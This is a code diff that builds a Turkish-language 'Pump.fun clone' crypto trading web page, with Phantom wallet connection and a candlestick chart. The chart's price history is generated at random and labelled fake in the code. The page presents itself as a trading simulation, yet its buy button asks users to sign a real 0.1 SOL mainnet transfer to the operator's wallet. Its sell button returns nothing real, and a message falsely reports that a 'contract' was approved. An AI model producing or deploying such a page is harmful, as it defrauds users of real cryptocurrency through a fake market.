@@ -1,62 +1,329 @@
-// KENDİ SOLANA CÜZDAN ADRESİNİ BURAYA YAZ
-const SENIN_CUZDAN_ADRESIN = "BU_KISMA_CUZDAN_ADRESINI_YAPISTIR"; 
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Duckcoin Terminal - Pump.fun Clone</title>
+    
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/apexcharts"></script>
+    
+    <style>
+        :root {
+            --primary: #14F195; /* Solana Yeşili */
+            --bg-dark: #0b0e14;
+            --panel-bg: #151924;
+            --border-color: #2b313f;
+            --up-color: #26a69a;
+            --down-color: #ef5350;
+        }
 
-// GERÇEK SOL TRANSFERİ YAPAN AL BUTONU
-async function al() {
-    if (!userPublicKey) {
-        alert("Lütfen önce cüzdanınızı bağlayın!");
-        return;
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: var(--bg-dark); color: #fff; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
+        
+        /* Üst Menü ve Cüzdan Butonu */
+        .header { width: 100%; max-width: 1000px; display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; background: var(--panel-bg); border-radius: 8px; margin-bottom: 20px; box-sizing: border-box; border: 1px solid var(--border-color); }
+        .logo { font-size: 1.8em; font-weight: 900; color: var(--primary); display: flex; align-items: center; gap: 10px; }
+        .wallet-btn { font-size: 1.1em; font-weight: bold; color: #fff; background: #AB9FF2; padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; display: flex; align-items: center; gap: 10px; transition: 0.2s; }
+        .wallet-btn:hover { background: #8a7ce0; transform: scale(1.05); }
+        .wallet-info { font-size: 1.2em; font-weight: bold; color: var(--primary); background: #222836; padding: 10px 15px; border-radius: 5px; border: 1px solid #3d4659; display: none; }
+        
+        .container { width: 100%; max-width: 1000px; background: var(--panel-bg); padding: 25px; border-radius: 8px; border: 1px solid var(--border-color); text-align: center; box-sizing: border-box; }
+        
+        /* Kurulum Ekranı */
+        #setupScreen { display: block; padding: 50px 0; }
+        input[type="text"] { width: 60%; padding: 15px; font-size: 1.5em; text-align: center; border-radius: 5px; border: 2px solid var(--border-color); background: var(--bg-dark); color: white; text-transform: uppercase; font-weight: bold; }
+        .btn-launch { background: var(--primary); color: black; font-size: 1.3em; font-weight: bold; padding: 15px 50px; border: none; border-radius: 5px; cursor: pointer; margin-top: 20px; transition: 0.1s; }
+        .btn-launch:active { transform: scale(0.95); }
+
+        /* Borsa Ekranı */
+        #marketScreen { display: none; }
+        
+        .market-header { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 15px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; }
+        .coin-name { font-size: 2.2em; font-weight: 900; margin-bottom: 5px; }
+        .inventory { color: #aaa; font-size: 1.1em; text-align: left; }
+        .price-box { text-align: right; }
+        .price { font-size: 2.5em; color: var(--up-color); font-family: monospace; font-weight: bold; }
+
+        /* Grafik Alanı */
+        #chart { width: 100%; height: 450px; background: var(--bg-dark); border-radius: 5px; border: 1px solid var(--border-color); margin-bottom: 20px; }
+
+        /* Al/Sat Butonları */
+        .controls { display: flex; gap: 20px; }
+        .btn { flex: 1; padding: 20px; font-size: 1.5em; font-weight: bold; border: none; border-radius: 8px; cursor: pointer; color: white; transition: 0.1s; display: flex; flex-direction: column; align-items: center; }
+        .btn span { font-size: 0.6em; font-weight: normal; opacity: 0.8; margin-top: 5px; }
+        
+        .btn-buy { background: var(--up-color); }
+        .btn-buy:active { background: #1d7d74; transform: scale(0.98); }
+        
+        .btn-sell { background: var(--down-color); }
+        .btn-sell:active { background: #c63936; transform: scale(0.98); }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">💊 Duckcoin Terminal</div>
+        <button class="wallet-btn" id="connectBtn" onclick="connectPhantom()">
+            👻 Phantom Bağla
+        </button>
+        <div class="wallet-info" id="walletInfo">
+            <span id="solBalance">0.0000</span> SOL
+        </div>
+    </div>
+
+    <div class="container" id="setupScreen">
+        <h2 style="margin-bottom: 10px; font-size: 2em;">🚀 Web3 Projeni Başlat</h2>
+        <p style="color: #888; margin-bottom: 30px;">Gerçek Phantom cüzdanınla bağlan, alım satım simülasyonunu başlat.</p>
+        <input type="text" id="coinInput" value="DUCKCOIN" placeholder="COIN ADI GİR">
+        <br>
+        <button class="btn-launch" onclick="baslat()">Tahtayı Aç</button>
+    </div>
+
+    <div class="container" id="marketScreen">
+        <div class="market-header">
+            <div>
+                <div class="coin-name" id="nameDisplay">$DUCKCOIN</div>
+                <div class="inventory" id="tokenDisplay">Cüzdan: 0 DUCK</div>
+            </div>
+            <div class="price-box">
+                <div class="price"><span id="priceDisplay">0.001000</span> SOL</div>
+            </div>
+        </div>
+        
+        <div id="chart"></div>
+
+        <div class="controls">
+            <button class="btn btn-buy" onclick="al()">
+                AL
+                <span>0.1 SOL Harca</span>
+            </button>
+            <button class="btn btn-sell" onclick="sat()">
+                TÜMÜNÜ SAT
+                <span>Piyasayı Çökert</span>
+            </button>
+        </div>
+    </div>
+
+<script>
+    // --- KRİTİK AYAR ---
+    // Eğer gerçek SOL transferi istiyorsan, buraya kendi Phantom Solana adresini yapıştır.
+    const SENIN_CUZDAN_ADRESIN = "BU_KISMA_KENDI_ADRESINI_YAZ"; 
+
+    // DEĞİŞKENLER
+    let userPublicKey = null;
+    let bakiyeSOL = 0.0000; 
+    let bakiyeToken = 0;
+    let fiyatSOL = 0.001000;
+    
+    // GRAFİK DEĞİŞKENLERİ
+    let chart;
+    let anaVeriHavuzu = []; 
+    let guncelZaman = new Date().getTime() - (3 * 60 * 60 * 1000); // 3 saat geçmiş veri
+
+    // 1. PHANTOM CÜZDAN BAĞLANTISI
+    async function connectPhantom() {
+        const isPhantomInstalled = window.solana && window.solana.isPhantom;
+
+        if (!isPhantomInstalled) {
+            alert("Phantom cüzdan bulunamadı! Lütfen tarayıcınıza Phantom kurun.");
+            return;
+        }
+
+        try {
+            const resp = await window.solana.connect();
+            userPublicKey = resp.publicKey;
+            
+            document.getElementById('connectBtn').style.display = 'none';
+            document.getElementById('walletInfo').style.display = 'block';
+
+            // Gerçek bakiyeyi Solana Mainnet'ten çek
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+            const balanceInLamports = await connection.getBalance(userPublicKey);
+            bakiyeSOL = balanceInLamports / solanaWeb3.LAMPORTS_PER_SOL;
+            
+            document.getElementById('solBalance').innerText = bakiyeSOL.toFixed(4);
+            
+        } catch (err) {
+            console.error("Bağlantı hatası:", err);
+            alert("Bağlantı iptal edildi.");
+        }
     }
 
-    // Ne kadar SOL kesileceği (Örn: 0.1 SOL)
-    const transferMiktariSOL = 0.1; 
+    // 2. SİSTEMİ BAŞLAT
+    function baslat() {
+        if (!userPublicKey) {
+            alert("İşlem yapabilmek için lütfen Phantom cüzdanınızı bağlayın!");
+            return;
+        }
 
-    if(bakiyeSOL < transferMiktariSOL) {
-        alert("Cüzdanınızda yeterli SOL bulunmuyor.");
-        return;
+        let isim = document.getElementById("coinInput").value.trim().toUpperCase();
+        if(isim === "") isim = "DUCKCOIN";
+        
+        document.getElementById("nameDisplay").innerText = "$" + isim;
+        document.getElementById("setupScreen").style.display = "none";
+        document.getElementById("marketScreen").style.display = "block";
+        
+        gecmisVeriUret();
+        grafikKur();
+        arayuzuGuncelle();
+        
+        setInterval(piyasaHareketiVeYeniMum, 2000); 
     }
 
-    try {
-        // 1. Solana Ağına Bağlan (Mainnet)
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-        const aliciCuzdan = new solanaWeb3.PublicKey(SENIN_CUZDAN_ADRESIN);
+    // 3. GEÇMİŞ VERİ ÜRETİCİ
+    function gecmisVeriUret() {
+        let sahteFiyat = 0.0002; 
+        for(let i = 0; i < 180; i++) { // 180 dakika (3 saat) sahte geçmiş
+            guncelZaman += 60000; 
+            let acilis = sahteFiyat;
+            sahteFiyat = sahteFiyat * (1 + (Math.random() * 0.05 - 0.025)); 
+            if(i === 179) sahteFiyat = 0.001000; // Son fiyatı sabitle
 
-        // 2. Transfer İşlemini (Transaction) Hazırla
-        const islem = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-                fromPubkey: userPublicKey, // Bağlı olan Phantom cüzdanı
-                toPubkey: aliciCuzdan,     // Senin cüzdanın
-                lamports: transferMiktariSOL * solanaWeb3.LAMPORTS_PER_SOL, // SOL'ü Lamport'a çevir
-            })
-        );
+            let yuksek = Math.max(acilis, sahteFiyat) * (1 + Math.random() * 0.005);
+            let dusuk = Math.min(acilis, sahteFiyat) * (1 - Math.random() * 0.005);
+            
+            anaVeriHavuzu.push({ x: guncelZaman, y: [acilis, yuksek, dusuk, sahteFiyat] });
+        }
+        fiyatSOL = sahteFiyat;
+    }
 
-        // 3. İşlem için güncel ağ blok kodunu al
-        islem.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
-        islem.feePayer = userPublicKey;
-
-        console.log("Phantom'dan onay bekleniyor...");
-        alert("Lütfen Phantom cüzdanınızdan işlemi onaylayın.");
-
-        // 4. Phantom'dan imza iste ve işlemi ağa gönder
-        const { signature } = await window.solana.signAndSendTransaction(islem);
+    // 4. ARAYÜZ GÜNCELLEME
+    function arayuzuGuncelle() {
+        document.getElementById("solBalance").innerText = bakiyeSOL.toFixed(4);
+        document.getElementById("priceDisplay").innerText = fiyatSOL.toFixed(6);
+        document.getElementById("tokenDisplay").innerText = "Cüzdan: " + Math.floor(bakiyeToken).toLocaleString() + " Adet";
         
-        console.log("İşlem ağa gönderildi! İmza:", signature);
-        
-        // 5. İşlemin ağda onaylanmasını bekle
-        await connection.confirmTransaction(signature);
-        
-        alert("İşlem Başarılı! " + transferMiktariSOL + " SOL transfer edildi.");
+        let sonMum = anaVeriHavuzu[anaVeriHavuzu.length - 1];
+        if(sonMum && fiyatSOL >= sonMum.y[0]) {
+            document.getElementById("priceDisplay").style.color = "var(--up-color)";
+        } else {
+            document.getElementById("priceDisplay").style.color = "var(--down-color)";
+        }
+    }
 
-        // Görsel simülasyonu güncelle (Fiyatı artır, bakiyeyi düş)
-        bakiyeSOL -= transferMiktariSOL;
-        let alinanMiktar = transferMiktariSOL / fiyatSOL;
+    // 5. GERÇEK WEB3 AL BUTONU (SOL TRANSFERİ)
+    async function al() {
+        const transferMiktariSOL = 0.1; 
+
+        if(bakiyeSOL < transferMiktariSOL) {
+            alert("Cüzdanınızda yeterli SOL bulunmuyor.");
+            return;
+        }
+
+        try {
+            // Solana Ağına Bağlan (Mainnet)
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
+            
+            // Eğer cüzdan adresi girilmediyse sadece simülasyon yap
+            if (SENIN_CUZDAN_ADRESIN === "BU_KISMA_KENDI_ADRESINI_YAZ" || SENIN_CUZDAN_ADRESIN === "") {
+                console.log("Cüzdan adresi girilmedi, sadece simülasyon çalışıyor.");
+                basariliAlimSimulasyonu(transferMiktariSOL);
+                return;
+            }
+
+            const aliciCuzdan = new solanaWeb3.PublicKey(SENIN_CUZDAN_ADRESIN);
+
+            // Transfer İşlemi Hazırla
+            const islem = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                    fromPubkey: userPublicKey, 
+                    toPubkey: aliciCuzdan,     
+                    lamports: transferMiktariSOL * solanaWeb3.LAMPORTS_PER_SOL, 
+                })
+            );
+
+            islem.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+            islem.feePayer = userPublicKey;
+
+            // Phantom'dan onay iste
+            const { signature } = await window.solana.signAndSendTransaction(islem);
+            
+            // İşlem onayını bekle
+            await connection.confirmTransaction(signature);
+            alert("İşlem Başarılı! Sözleşme onaylandı.");
+
+            // Grafik ve Bakiyeyi Güncelle
+            basariliAlimSimulasyonu(transferMiktariSOL);
+
+        } catch (hata) {
+            console.error("İşlem başarısız:", hata);
+            alert("İşlem iptal edildi veya Phantom reddetti.");
+        }
+    }
+
+    // ALIM SONRASI GRAFİK HAREKETİ
+    function basariliAlimSimulasyonu(harcananSOL) {
+        bakiyeSOL -= harcananSOL;
+        let alinanMiktar = harcananSOL / fiyatSOL;
         bakiyeToken += alinanMiktar;
-        fiyatSOL = fiyatSOL * (1 + (Math.random() * 0.06 + 0.03));
         
+        // Pump Etkisi
+        fiyatSOL = fiyatSOL * (1 + (Math.random() * 0.08 + 0.03));
         sonMumuGuncelleVeCiz();
-
-    } catch (hata) {
-        console.error("İşlem başarısız veya reddedildi:", hata);
-        alert("İşlem iptal edildi veya başarısız oldu.");
     }
-}
+
+    // 6. SAT BUTONU (Simülasyon)
+    function sat() {
+        if(bakiyeToken > 0) {
+            let eldeEdilenSOL = bakiyeToken * fiyatSOL;
+            bakiyeSOL += eldeEdilenSOL; 
+            bakiyeToken = 0;
+            
+            // Dump Etkisi
+            fiyatSOL = fiyatSOL * (1 - (Math.random() * 0.12 + 0.05));
+            if(fiyatSOL < 0.000001) fiyatSOL = 0.000001;
+            
+            sonMumuGuncelleVeCiz();
+        } else {
+            alert("Satacak coin yok!");
+        }
+    }
+
+    // 7. GRAFİK GÜNCELLEMELERİ
+    function sonMumuGuncelleVeCiz() {
+        let sonMum = anaVeriHavuzu[anaVeriHavuzu.length - 1];
+        sonMum.y[3] = fiyatSOL; 
+        if(fiyatSOL > sonMum.y[1]) sonMum.y[1] = fiyatSOL; 
+        if(fiyatSOL < sonMum.y[2]) sonMum.y[2] = fiyatSOL; 
+        
+        arayuzuGuncelle();
+        grafikGuncelle();
+    }
+
+    function piyasaHareketiVeYeniMum() {
+        guncelZaman += 60000; 
+        fiyatSOL = fiyatSOL * (1 + (Math.random() * 0.016 - 0.008));
+        anaVeriHavuzu.push({ x: guncelZaman, y: [fiyatSOL, fiyatSOL, fiyatSOL, fiyatSOL] });
+        
+        // Son 100 mumu tutarak belleği koru
+        if(anaVeriHavuzu.length > 100) anaVeriHavuzu.shift();
+        
+        arayuzuGuncelle();
+        grafikGuncelle();
+    }
+
+    // 8. APEXCHARTS KURULUMU
+    function grafikKur() {
+        var options = {
+            series: [{ data: anaVeriHavuzu }],
+            chart: { type: 'candlestick', height: 450, background: '#0b0e14', animations: { enabled: false }, toolbar: { show: false } },
+            theme: { mode: 'dark' },
+            xaxis: { type: 'datetime', labels: { style: { colors: '#888' }, datetimeUTC: false, format: 'HH:mm' }, axisBorder: { show: false } },
+            yaxis: { tooltip: { enabled: true }, labels: { formatter: function(val) { return val.toFixed(6); }, style: { colors: '#888' } } },
+            plotOptions: { candlestick: { colors: { upward: '#26a69a', downward: '#ef5350' }, wick: { useFillColor: true } } },
+            grid: { borderColor: '#2b313f', strokeDashArray: 3 }
+        };
+
+        chart = new ApexCharts(document.querySelector("#chart"), options);
+        chart.render();
+    }
+
+    function grafikGuncelle() {
+        if(chart) {
+            try { chart.updateSeries([{ data: anaVeriHavuzu }]); } catch(e){}
+        }
+    }
+</script>
+
+</body>
+</html>
